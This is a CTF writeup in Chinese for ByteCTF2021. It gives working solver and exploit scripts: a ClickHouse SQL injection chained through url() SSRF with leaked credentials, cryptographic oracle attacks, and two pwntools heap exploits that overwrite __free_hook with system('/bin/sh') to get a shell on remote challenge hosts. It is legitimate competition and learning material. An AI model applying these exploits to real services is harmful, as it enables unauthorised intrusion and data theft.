# ByteCTF2021 Writeup by 欢迎妹子打电话

![bytectf2021](https://gitee.com/leonsec/images/raw/master/bytectf2021.png)

## Web

### double sqli

报错看到clickhouse数据库

```sql
# databases
?id=2 or (SELECT name FROM system.databases limit 0,1)
Result: ...(CAST('ctf', 'String')...

?id=2 or (SELECT name FROM system.databases limit 1,1)
Result: ...(CAST('default', 'String')...

# tables
?id=2 or (SELECT concat(name,',',database) FROM system.tables limit 0,1)
Result: ...(CAST('hint,ctf', 'String')...

?id=2 or (SELECT concat(name,',',database) FROM system.tables limit 1,1)
Result: ...(CAST('hello,default', 'String')...

# columns
?id=2 or (SELECT concat(name,',',table) FROM system.columns limit 0,1)
Result: ...(CAST('id,hint', 'String')...

# ctf.hint
?id=2 or (SELECT * FROM ctf.hint limit 0,1)
Result: ...(CAST('you_dont_have_permissions_to_read_flag', 'String')...

```

提示发现当前user_02没有权限读flag

文件目录发现目录穿越：

http://39.105.175.150:30001/files../

![](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/202110181030161.png)


查阅文档，看到clickhouse允许[http接口操作数据库](https://clickhouse.com/docs/zh/interfaces/http/)，还发现[`url()`函数支持内联查询](https://clickhouse.com/docs/zh/sql-reference/table-functions/url/)，可以利用其进行SSRF，操作内网http接口，对数据库进行操作

读配置文件得到：

/var/lib/clickhouse/access/3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql
```sql
ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';
ATTACH GRANT SELECT ON ctf.* TO user_01;
```

/etc/clickhouse-server/config.xml
```xml
<http_port>8123</http_port>
```

所以我们得到了user_01的权限，还知道了内网http接口的端口，可以构造payload交互，更改用户后查询

payload:

```sql
?id=2%20or%20(SELECT%20*%20FROM%20url(%27http%3A%2F%2Flocalhost%3A8123%2F%3Fquery%3Dselect%2Bflag%2Bfrom%2Bctf.flag%26user%3Duser_01%26password%3De3b0c44298fc1c149afb%27,%20CSV,%20%27column1%20String,%20column2%20UInt32%27))
```

## Crypto

### easyxor

flag分成两半，一半是OFB模式，一半是CBC模式。由于已知flag的开头是'ByteCTF{'，刚好是8个字节，一整个block，所以可以用它异或第一块密文得到第一个cur_c。

然后可以爆破keys，需要爆64^4次，然后使用keys去解密，如果解出的一整块字节串都是printable的，那么就可以用它尝试解下面一个块，这样两层筛选，只有一个keys是满足条件的。

```python
from itertools import product
from unShift import unBitShift
from tqdm import tqdm
from Crypto.Util.number import bytes_to_long, long_to_bytes
def check(s):
    return min([((i<129) and (i>31)) for i in s])

c = "89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912"
c_list = [int(c[i*16:i*16+16], 16) for i in range(len(c)//16)]
known_m = bytes_to_long(b'ByteCTF{')
range64 = list(range(-32, 33))
cur_c = known_m^c_list[0]
print(cur_c)
# 直接处理枚举完需要6s，来爆破第二块的明文，条件是8个字节都printable，加上convert需要31s，72s

k_cnt = 0
for a,b,c,d in tqdm(product(range64, range64, range64, range64)): # 17850625it
    last = cur_c
    k = [a, b, c, d]
    try_cur_c = convert(last, k)
    m1 = long_to_bytes(try_cur_c ^ c_list[1])
    if check(m1): # 只筛选这第一轮的话，4836个k是满足条件的，所以得筛第二轮
        last = try_cur_c
        try_cur_c = convert(last, k)
        m2 = long_to_bytes(try_cur_c ^ c_list[2])
        if check(m2):
            k_cnt += 1
            try:
                print(m1.decode()+m2.decode(), k)
            except:
                print("error")
print(k_cnt)
# keys = [-12, 26, -3, -31]
```
所以得到了`keys = [-12, 26, -3, -31]`，和前半段flag：`ByteCTF{5831a241s-f30980`。

对于convert(m, key)函数，需要写一个它的逆函数re_convert(m, key)，然后使用keys直接回推明文就可以了。

```python
from itertools import product
from unShift import unBitShift
from tqdm import tqdm
from Crypto.Util.number import bytes_to_long, long_to_bytes
keys = [-12, 26, -3, -31]
k = keys
c = "89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912"
cl = [int(c[i*16:i*16+16], 16) for i in range(len(c)//16)]
known_m = bytes_to_long(b'ByteCTF{')
cur_c = known_m ^ cl[0]

def shift(m, k, c):
    if k < 0:
        return m ^ m >> (-k) & c
    return m ^ m << k & c

def convert(m, key):
    c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c]
    for t in range(4):
        m = shift(m, key[t], c_list[t])
    return m

def re_shift(m, k, c):
    unshift = unBitShift()
    if k < 0:
        tmp = unshift.RightXorMasked(m, -k, c)
        return tmp
    tmp = unshift.LeftXorMasked(m, k, c)
    return tmp

def re_convert(m, key):
    c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c]
    for t in [3,2,1,0]:
        m = re_shift(m, key[t], c_list[t])
    return m

IV = re_convert(cur_c, k)
assert IV.bit_length() == 64

last = IV
cur = re_convert(cl[3], k)
m3 = long_to_bytes(cur ^ last)
print(m3)

last = cl[3]
cur = re_convert(cl[4], k)
m4 = long_to_bytes(cur ^ last)
print(m4)

last = cl[4]
cur = re_convert(cl[5], k)
m5 = long_to_bytes(cur ^ last)
print(m5)

print(m3+m4+m5)
```

最终得到完整的flag：ByteCTF{5831a241s-f30980q535af-2156547475u2t}

### abusedkey

首先把用到的数据放在了task_data.py，方便些其他脚本时直接导入：

```python
URL = "http://39.105.181.182:30000"
msg11 = URL+"/abusedkey/server/msg11"
msg13 = URL+"/abusedkey/server/msg13"
msg21 = URL+"/abusedkey/server/msg21"
msg23 = URL+"/abusedkey/ttp/msg23"
msg25 = URL+"/abusedkey/server/msg25"

# -------------------------------- Secp256k1 --------------------------------
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
a, b = 0, 7
G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
     0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
# ------------------ https://en.bitcoin.it/wiki/Secp256k1 -------------------

Pc = (0xb5b1b07d251b299844d968be56284ef32dffd0baa6a0353baf10c90298dfd117,
      0xea62978d102a76c3d6747e283091ac5f2b4c3ba5fc7a906fe023ee3bc61b50fe)
```

协议2的部分，想要拿到hint很简单，只要按照描述实现出来，就拿到了hint，hint.sage:

```python
import requests, os, random
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from task_data import p, a, b, G, msg21, msg23, msg25
from hashlib import sha256

E = EllipticCurve(IntegerModRing(p), [a, b])
G = E(G)

# sid2 = hex(random.getrandbits(256))[2:]
sid2 = "8d1a95ce724141a0ea7c8ffa7eddc48605b3117c8aa886bcc2aff3b0c2175b56"
msg22 = requests.get(msg21, data=sid2).text
Qs_hex = msg22

rc = 1 # random.randint(1, p)
Rc = rc*G

Pic = long_to_bytes(int('FFFF', 16))
hc = int(sha256(Pic).hexdigest(), 16)
Qc = hc*Rc
Qc_hex = hex(Qc[0])[2:].rjust(64) + hex(Qc[1])[2:].rjust(64)
assert len(Qc_hex) == 128

msg24 = requests.get(msg23, data=Qc_hex+Qs_hex).text
assert len(msg24) == 256
Yc_hex, Ys_hex = msg24[:128], msg24[128:]

msg26 = requests.get(msg25, data=sid2+Yc_hex).text

Ys = E((int(Ys_hex[:64], 16), int(Ys_hex[64:], 16)))
Zcs = rc*Ys
Zcsx = long_to_bytes(int(Zcs[0]))
sk2 = sha256(Zcsx).digest()

msg26 = bytes.fromhex(msg26)
iv, ciphertext, mac = msg26[:12], msg26[12:-16], msg26[-16:]
cipher = AES.new(sk2, mode=AES.MODE_GCM, nonce=iv)
try:
    m = cipher.decrypt_and_verify(ciphertext, mac)
    print(m.decode())
except ValueError:
    print("MAC check failed")
# off-line guessing on protocol_II, and key compromise impersonation on protocol_I
```

Hint: off-line guessing on protocol_II, and key compromise impersonation on protocol_I

hint和题目描述都在说明，两个协议共用一个Server端的key，那么大概思路就是通过协议2拿到key，再将这个key用于解协议1的flag，可以先简单分析一下：

```python
已知 rc-(随机), hc-H(c口令)
未知 rs-(随机), hs-H(s口令)
Qc = rc * hc * G --- 已知
Qs = rs * hs * G --- 已知

Yc = rc * rt * G --- 已知
Ys = rs * rt * G --- 已知

Zcs = rc * rs * rt * G --- 已知 公共密钥
```

这里面的rc是我们可以控制的，所以可以令rc=1让问题看起来简单一点。

```python
rc = 1 时：

Qc = hc * G --- 已知
Qs = rs * hs * G --- 已知

Yc  =      rt * G --- 已知
Ys  = rs * rt * G --- 已知
Zcs = rs * rt * G --- 已知 公共密钥
```

hs是两个字节的sha256结果，显然是让我们爆破的，也就是说我们需要得到一组形式为`hs*Point`和`Point`的数据，这样去爆两个字节就可以了，为了得到这样的数据，我们需要构造一下发送的数据。

```python
发送假的 Qc = hc * rs * hs * G = hc * Qs
得到    Yc = hs * rs * rt * G

发送 Qs = rs * hs * G
得到 Ys = rs * rt * G
```

这样以来，Ys和Yc刚好是我们需要的一组数据，然后爆破一下两个字节就可以得到hs了：

```python
import requests, os, random, tqdm
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from task_data import p, a, b, G, msg21, msg23, msg25
from hashlib import sha256

E = EllipticCurve(IntegerModRing(p), [a, b])
G = E(G)

sid2 = "8d1a95ce724141a0ea7c8ffa7eddc48605b3117c8aa886bcc2aff3b0c2175b56"
msg22 = requests.get(msg21, data=sid2).text
Qs = E((int(msg22[:64], 16), int(msg22[64:], 16)))


rc = 1 # random.randint(1, p)
Rc = rc*G

Pic = long_to_bytes(int('FFFF', 16))
hc = int(sha256(Pic).hexdigest(), 16)
fake_Qc = hc * Qs # hc * rs * hs * G
fake_Qc_hex = hex(fake_Qc[0])[2:].rjust(64) + hex(fake_Qc[1])[2:].rjust(64)

msg24 = requests.get(msg23, data=fake_Qc_hex+msg22).text
assert len(msg24) == 256
Yc_hex, Ys_hex = msg24[:128], msg24[128:]

# hs * rs * rt * G
Yc = E((int(Yc_hex[:64], 16), int(Yc_hex[64:], 16)))
#      rs * rt * G
Ys = E((int(Ys_hex[:64], 16), int(Ys_hex[64:], 16)))

for pis in tqdm.tqdm(range(0xff, 0xffff+1)):
    hs = int(sha256(long_to_bytes(pis)).hexdigest(), 16)
    if ((hs*Ys) == Yc):
        print(f'pis = {pis}\nhs = {hs}')
        break

'''
pis = 36727
hs = 67294392667457530634966084521984708026794776225602296684920633502274376489620
'''
```

协议2搞到了hs，也就是协议1中的服务端私钥ds，所以服务端的公钥也很容易得到，这样就有了$(d_S,P_S)$，还有题目给我们的$P_C$，一旦计算出$K_{CS}$就可以解出flag了，那么问题是看起来我们必须知道$t_S$和$d_C$中的一个，所以需要想办法把它消掉，在要求上传$T_C$的时候，上传$-T_C$就可以了。

```python
import requests, random
from Crypto.Util.number import *
from Crypto.Cipher import AES
from task_data import p, a, b, G, msg11, msg13, Pc
from hashlib import sha256


E = EllipticCurve(IntegerModRing(p), [a, b])
G = E(G)
sid1 = "8d1a95ce724141a0ea7c8ffa7eddc48605b3117c8aa886bcc2aff3b0c2175b56"

msg12 = requests.get(msg11, data=sid1).text
ds = 67294392667457530634966084521984708026794776225602296684920633502274376489620
Ps = ds*G
Pc = E(Pc)
invPc = -1*Pc
print(invPc)
invPc_hex = hex(invPc[0])[2:].rjust(64) + hex(invPc[1])[2:].rjust(64)
msg14 = requests.get(msg13, data=sid1+invPc_hex).text

Kcs = ds*invPc
sk1 = sha256(long_to_bytes(int(Kcs[0]))).digest()

msg26 = bytes.fromhex(msg14)
iv, ciphertext, mac = msg26[:12], msg26[12:-16], msg26[-16:]
cipher = AES.new(sk1, mode=AES.MODE_GCM, nonce=iv)
try:
    m = cipher.decrypt_and_verify(ciphertext, mac)
    print(m.decode())
except ValueError:
    print("MAC check failed")
```

### JustDecrypt

这题和之前做过的一个题目比较类似，代码改一改就可以了，需要注意的是每次不是以块为单位来爆破，而是每个字节的爆，CFB-1。

需要的明文长度是64，需要65次交互，但是题目只给了52次，所以有点麻烦，没多想别的方法，直接爆力每次pading错了就重新连接服务器，这样平均每次连接服务器得到flag的概率是$\frac{1}{256}$，勉强可以接受，事实上连了一百多次就出flag了。

```python
from Crypto.Util.number import *
from pwn import *
from tqdm import tqdm
def main():
    r = remote('39.105.181.182', '30001')
    plaintext = b"Hello, I'm a Bytedancer. Please give me the flag!"+b"\x0f"*15

    def my_XOR(a, b):
        assert len(a) == len(b)
        return b''.join([long_to_bytes(a[i]^b[i]) for i in range(len(a))])

    def proof_of_work():
        rev = r.recvuntil(b"sha256(XXXX+")
        suffix = r.recv(28).decode()
        rev = r.recvuntil(b" == ")
        tar = r.recv(64).decode()

        def f(x):
            hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest()
            return hashresult == tar

        prefix = util.iters.mbruteforce(f, string.digits + string.ascii_letters, 4, 'upto')
        r.recvuntil(b'Give me XXXX > ')
        r.sendline(prefix.encode())

    def decrypt(msg):
        newmsg = msg + b'\x00'*(256+64-len(msg))
        r.recvuntil(b'Please enter your cipher in hex > ')
        r.sendline(newmsg.hex().encode())
        r.recvline()
        result = r.recvline().decode().strip()
        return bytes.fromhex(result)

    def decrypt_(msg):
        newmsg = msg + b'\x00'*(256-len(msg))
        r.recvuntil(b'Please enter your cipher in hex > ')
        r.sendline(newmsg.hex().encode())
        r.recvline()
        result = r.recvline().decode().strip()
        return bytes.fromhex(result)
    
    proof_of_work()
    msg = b'\x00'*16
    decrypt(msg)
    c = b""
    for i in range(50):
        t = decrypt(c)[i]
        c += long_to_bytes(t^plaintext[i])

    decc = decrypt_(c)
    print(decc)
    res = r.recvline()+r.recvline()
    if b"Here is your flag" in res:
        print(r.recvline())
        print(r.recvline())
        r.close()
        return (True, len(decc))
    r.close()
    return (False, len(decc))

ll = []
while True:
    ss = main()
    ll.append(ss[1])
    if ss[0]: break
    print(len(ll), ll)
```

### Overheard

相当于一个Oracle，给返回pow(msg, b, p)的高位，可以想办法利用coppersmith定理。先后发送Alice和pow(Alice, 2, p)的值，然后得到x1，x2，那么在模p的多项式$f(x) = (x1 + a)^2 - x2 - b$ 的值为0，所以解这个方程的small roots就可以得到被舍弃的值（小于64bit）。

```python
from pwn import remote
from Crypto.Util.number import *
import itertools

r = remote('39.105.38.192', 30000)
p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
g = 5

r.sendlineafter(b"$ ", b"1")
Alice = int(r.recvline().decode().strip()) 

r.sendlineafter(b"$ ", b"2")
Bob = int(r.recvline().decode().strip()) 


r.sendlineafter(b"$ ", b"3")
r.sendlineafter(b"To Bob: ", str(Alice).encode())
x1 = int(r.recvline().decode().strip()) 

r.sendlineafter(b"$ ", b"3")
r.sendlineafter(b"To Bob: ", str(pow(Alice, 2, p)).encode())
x2 = int(r.recvline().decode().strip()) 

def small_roots(f, bounds, m=1, d=None):
	if not d:
		d = f.degree()
	R = f.base_ring()
	N = R.cardinality()
	f /= f.coefficients().pop(0)
	f = f.change_ring(ZZ)
	G = Sequence([], f.parent())
	for i in range(m+1):
		base = N^(m-i) * f^i
		for shifts in itertools.product(range(d), repeat=f.nvariables()):
			g = base * prod(map(power, f.variables(), shifts))
			G.append(g)
	B, monomials = G.coefficient_matrix()
	monomials = vector(monomials)
	factors = [monomial(*bounds) for monomial in monomials]
	for i, factor in enumerate(factors):
		B.rescale_col(i, factor)
	B = B.dense_matrix().LLL()
	B = B.change_ring(QQ)
	for i, factor in enumerate(factors):
		B.rescale_col(i, 1/factor)
	H = Sequence([], f.parent().change_ring(QQ))
	for h in filter(None, B*monomials):
		H.append(h)
		I = H.ideal()
		if I.dimension() == -1:
			H.pop()
		elif I.dimension() == 0:
			roots = []
			for root in I.variety(ring=ZZ):
				root = tuple(R(root[var]) for var in f.variables())
				roots.append(root)
			return roots
	return []

PR.<a,b> = PolynomialRing(Zmod(p))
f = (x1 + a)**2 - x2 - b
ans = small_roots(f, (2**64, 2**64), m=8)
print("ans =", ans)
r.sendlineafter(b'$ ', b'4')
r.sendlineafter(b'secret: ', str(x1 + ans[0][0]).encode())
print(r.recvline().decode().strip())
r.close()
'''
ans = [(275016199582168079, 3988784878785365375)]
b'ByteCTF{0fcca5ab-c7dc-4b9a-83f0-b24d4d004c19}'
'''
```

## Pwn

### bytecsms
堆风水,让upload的堆块含于当前可以edit控制的堆块中，如此可以控制upload堆块然后leak信息等等，然后同样控制upload堆块chunk size，来进行large bin attack的布局，利用house of pig的做法，布局好就能exit的时候刷新缓冲区从而任意申请堆块进行数据拷贝
```python
from pwn import*
def menu(ch):
	p.sendlineafter('> ',str(ch))
def add(name,score):
	menu(1)
	p.sendlineafter('name:',name)
	p.sendlineafter('scores',str(score))
	p.sendlineafter('return','2')
def free(name=None,index=None):
	menu(2)
	if name != None:
		p.sendlineafter('2.Remove by index',str(1))
		p.sendlineafter('deleted',name)
	elif index != None:
		p.sendlineafter('2.Remove by index',str(2))
		p.sendlineafter('Index?',str(index))
def edit(new_name,new_score,name=None,index=None):
	menu(3)
	if name != None:
		p.sendlineafter('by index',str(1))
		p.sendlineafter('be edit',name)
		p.sendlineafter('Enter the new name:',new_name)
		p.sendlineafter('Enter the new score:',str(new_score))
	elif index != None:
		p.sendlineafter('by index',str(2))
		p.sendlineafter('Index?',str(index))
		p.sendlineafter('Enter the new name:',new_name)
		p.sendlineafter('Enter the new score:',str(new_score))
def upload():
	menu(4)
	# alloc a chunk to save data
def download():
	menu(5)
	# download data from upload_chunk and append 
p = process('./main')
p = remote('39.105.63.142',30011)
libc = ELF('./libc-2.31.so')

context.log_level = 'DEBUG'
p.sendafter('Password for admin:','\x00'*0x18)

add('FMYY',0)
menu(4)

edit('\x00'*0x18 + p64(0x521 + 0x60) + '\x00'*0x18 + p64(0xF121) + '\x00'*0x400 + p64(0x390) + p64(0x80) + '\x00'*(0x4F0 + 0x50 - 0x400) + p64(0) + p64(0x21) + '\x00'*0x18 + p64(0x21) + '\x00'*0x10 + p64(0x440) + p64(0x21) + '\x00'*0x18 + p64(0x21) + '\x00'*0x18 + p64(0x21) + ('\x00'*0x18 + p64(0x21))*0x20,0,index=0)

menu(4)
menu(5)

edit('\x00'*0x18 + p64(0x21) + '\x00'*8 + p64(0x0F0F1),0,index=0)
menu(4)

menu(3)
p.sendlineafter('by index',str(2))
p.sendlineafter('Index?',str(2))

p.recvuntil('Scores\n2\t')
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x11EB0
log.info('HEAP:\t' + hex(heap_base))
p.sendlineafter('Enter the new name:',p64(heap_base + 0xF8) + p64(0xF0f1) + '\x00'*0x8 + p64(0xB1) + '\x00'*8 + p64(0xf0f1) + p64(0) + p64(0xC1) + p64(0)*3 + p64(0x21) + p64(0) + p64(0xC1) + p64(0) + p32(0x391))
p.sendlineafter('Enter the new score:','-1')

menu(4)
edit('\x00'*0x48 + p64(0xF0F1 + 0x10) ,0,index=0)

menu(4)
menu(5)
edit('U'*0x48 + p64(0xF0F1 + 0x10) + p64(heap_base + 0xF8 ) ,0,index=0)
menu(5)
edit('\x00'*0x18 + p64(0x4A1) + '\x00'*0x30 + p64(heap_base + 0xF8) +  '\x00'*(0x90 - 0x38) + p64(0x490) + p64(0x61) +  p64(0xDCD1)*4  + '\x00'*0x18 + p64(0x431 + 0x60),0,index=0)

menu(4)
menu(3)
p.sendlineafter('by index',str(2))
p.sendlineafter('Index?',str(0x10))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70
log.info('LIBC:\t'  + hex(libc_base))

p.sendlineafter('Enter the new name:',p64(libc_base + libc.sym['__malloc_hook'] + 0x70)*2)
p.sendlineafter('Enter the new score:',str((libc_base >> 32)))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

menu(4)
menu(4)
edit(p64(libc_base + libc.sym['__free_hook']) + '\x00'*0x40 + p64(0x4A1) + p64(libc_base + libc.sym['__malloc_hook'] + 0x480)*2 + p64(heap_base + 0x120E0) + p64(libc_base + libc.sym['_IO_list_all'] - 0x20) ,0,index=0x18)
########################################
size = (0xA0 - 100)/2
Data = heap_base + 0x12AF0 + 0xD8*2 + 0x10 + 0x10
payload  = ''
payload += '\x00'*8 + p64(heap_base + 0x12AF0) # srop
payload += '\x00'*8 + p64(Data)
payload += p64(Data + size)+p64(0)
payload += '\x00'*0x10
payload += '\x00'*0x08 + p64(heap_base + 0x12AF0) #chain
payload += '\x00'*0x10
payload += "\x00"*0x10
payload += '\x00'*0x40
payload +=  '\x00'*8 + p64(0x1ED560 + libc_base)

########################################

edit(payload,0,index = 0x11)
menu(5)
#########################################
payload  = '\x00'*0x20
payload += '\x00'*8 + p64(heap_base + 0x12AF0) # srop
payload += '\x00'*8 + p64(Data + 0x20)
payload += p64(Data + 0x20 + size)+p64(0)
payload += '\x00'*0x10
payload += '\x00'*0x08 + p64(heap_base + 0x12AF0 + 0xE0) #chain
payload += '\x00'*0x10
payload += "\x00"*0x10
payload += '\x00'*0x40
payload +=  '\x00'*8 + p64(0x1ED560 + libc_base)

size2 = (0xE0 - 100 )/2
payload += '\x00'*0x20
payload += '\x00'*8 + p64(heap_base + 0x12AF0) # srop
payload += '\x00'*8 + p64(Data + 0x40)
payload += p64(Data + 0x40 + size2)+p64(0)
payload += '\x00'*0x10
payload += '\x00'*0x08 + p64(heap_base + 0x12AF0 + 0xD8*2) #chain
payload += '\x00'*0x10
payload += "\x00"*0x10
payload += '\x00'*0x40
payload +=  '\x00'*8 + p64(0x1ED560 + libc_base)
payload +=  p64(0x21)*2
payload += p64(libc_base + libc.sym['__free_hook'] - 0x10)*3
payload +=  p64(0x21)
payload += p64(libc_base + libc.sym['__free_hook'] - 0x10)*3
payload +=  p64(0x21)
payload += '/bin/sh\x00'*2 + p64(libc_base + libc.sym['system'])
#########################################
edit(payload,0,index=0)
menu(6)
log.info('LIBC:\t'  + hex(libc_base))
log.info('HEAP:\t'  + hex(heap_base))
p.interactive()
```

### babyzone
```python
from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def add(Type,index,name,age):
	menu(1)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('index:',str(index))
	p.sendlineafter('name:',name)
	p.sendlineafter('age:',str(age))
def show(Type,index):
	menu(2)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('index:',str(index))
def edit_name(Type,index,new_name):
	menu(1)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('index:',str(index))
	menu(3)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('new name:',new_name)
def add_age(Type,index,new_age):
	menu(1)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('index:',str(index))
	menu(2)
	if Type == 1:
		p.sendlineafter('cat or dog?','cat')
	else:
		p.sendlineafter('cat or dog?','dog')
	p.sendlineafter('add',str(new_age))
p = process('./main')
p = remote('39.105.63.142',30012)
libc = ELF('./libc-2.31.so')

'''
struct cat {
	void *vtable_ptr;
	char *name;
	size_t name_len;
	char small_name[0x10];
	size_t age;
}
struct dog {
	void *vtable_ptr;
	size_t age;
	char *name;
	size_t name_len;
	char small_name[0x10];
}
'''
add(1,1,'F'*0x4C0,0x100)
add(2,1,'F'*0x4C0,0x200)
add(2,2,'F'*0x110,0x300)
add(1,3,'FMYY',0x400)
add(2,3,'QWER',0x500)
menu(3)
edit_name(2,1,'FMYY')
edit_name(1,1,'FMYY')
menu(4)
add(1,1,'FMYY',0x300)
menu(3)
menu(3)
p.sendlineafter('cat or dog?','cat')
p.sendlineafter('new name:','\x00\x00'*2 + '\x01\x00' + '\x00\x00'*0x3D + '\x00'*0x10)
edit_name(2,3,p64(0x1000) + '\x00'*0x28)
menu(4)
show(1,3)
p.recvuntil(p64(0) + p64(0x4d1))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 1152
log.info('LIBC:\t' + hex(libc_base))
add(2,4,'QWER',0x600)
menu(3)
menu(3)
p.sendlineafter('cat or dog?','cat')
p.sendlineafter('new name:','\x00\x00'*5 + '\x01\x00' + '\x00\x00'*0x3A + '\x00'*8*5 + p64(libc_base + libc.sym['__free_hook'] - 0x10))
edit_name(2,4,'/bin/sh\x00'*2 + p64(libc_base + libc.sym['system']) + '\x00'*0x48)
p.interactive()
```


## Reverse

### 0x6d21
文件放在手机上 gdb远程调试 用到的浮点 向量寄存器 gdb都打印出来
```python
# coding=utf-8
from z3 import *
table1 = [0x15,0xd,0x8,0x5]
table2 = [0x3,0x2,0x1,0x1]
result = [0xd2c,0x00000a3d,0x000009d9,0x00000bf2,0x00000b1c,0x0000095c,0x00000a12,0x00000d1e
       ,  0x00000b72,0x0000093f,0x00000957,0x00000bcc,0x0000055f,0x00000559,0x000006da,0x000009e1]
flag = [Int("x%d"%i) for i in range(16)]
s = Solver()
for i in range(4):
    v4 = flag[2] * table1[i] + flag[3] * table2[i] + flag[0] * table2[3-i] + flag[1] * table1[3-i]
    s.add(v4 == result[i])
    v5 = flag[4+2] * table1[i] + flag[4+3] * table2[i] + flag[4+0] * table2[3-i] + flag[4+1] * table1[3-i]
    s.add(v5 == result[4+i])
    v6 = flag[8+2] * table1[i] + flag[8+3] * table2[i] + flag[8+0] * table2[3-i] + flag[8+1] * table1[3-i]
    s.add(v6 == result[8+i])
    v7 = flag[12+2] * table1[i] + flag[12+3] * table2[i] + flag[12+0] * table2[3-i] + flag[12+1] * table1[3-i]
    s.add(v7 == result[12+i])


if(s.check() == sat):
    m = s.model()
    Str = [chr(m[flag[i]].as_long().real) for i in range(16)]
    print("".join(Str))
```


## Misc

### Checkin

公众号回复“安全范儿”

### Survey

填写问卷

### HearingNotBelieving

flag分为两段，两个二维码

一个是频谱直接看出来3段截断的二维码，拼起来即可

第二个利用sstv得到一张图，可以看到二维码，处理一下即可